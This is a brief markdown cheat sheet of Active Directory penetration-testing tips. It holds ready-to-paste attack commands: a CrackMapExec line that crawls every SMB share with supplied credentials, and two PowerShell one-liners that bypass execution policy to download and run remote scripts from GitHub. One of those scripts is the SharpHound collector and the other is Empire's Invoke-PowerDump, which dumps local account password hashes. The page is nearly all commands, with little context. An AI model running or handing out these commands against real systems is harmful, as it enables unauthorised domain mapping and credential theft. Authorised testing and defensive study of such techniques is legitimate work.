# Pentest Tips

Some tips from a cybersecurity consultant in France.

## Pentest Active Directory

### CrackMapExec :

Dump all shares :

```markdown
cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
```

### PowerShell one-liners

Bloodhound : Using ingestors to collect the data and then send it to BloodHound.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound
```

PowerDump : Dump all local accounts :

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump
```

